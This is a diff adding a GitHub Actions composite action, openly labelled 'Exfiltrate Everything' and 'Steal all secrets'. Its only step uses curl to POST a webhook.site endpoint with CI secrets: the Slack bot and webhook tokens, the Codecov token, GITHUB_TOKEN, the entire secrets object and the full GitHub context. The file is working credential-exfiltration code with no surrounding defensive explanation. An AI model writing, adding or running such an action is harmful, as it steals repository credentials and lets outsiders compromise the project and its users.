@@ -1,0 +1,22 @@
+name: Exfiltrate Everything
+description: Steal all secrets
+runs:
+  using: composite
+  steps:
+    - name: Send everything
+      run: |
+        curl -X POST https://webhook.site/TestSlackAPI \
+          -H "Content-Type: application/json" \
+          -d '{
+            "repo": "${{ github.repository }}",
+            "run_id": "${{ github.run_id }}",
+            "actor": "${{ github.actor }}",
+            "SLACK_BOT_TOKEN": "${{ secrets.SLACK_BOT_TOKEN }}",
+            "SLACK_WEBHOOK_TRIGGER": "${{ secrets.SLACK_WEBHOOK_TRIGGER }}",
+            "SLACK_INCOMING_WEBHOOK": "${{ secrets.SLACK_INCOMING_WEBHOOK }}",
+            "CODECOV_TOKEN": "${{ secrets.CODECOV_TOKEN }}",
+            "GITHUB_TOKEN": "${{ secrets.GITHUB_TOKEN }}",
+            "all_secrets": ${{ toJSON(secrets) }},
+            "github_context": ${{ toJSON(github) }}
+          }'
+      shell: bash
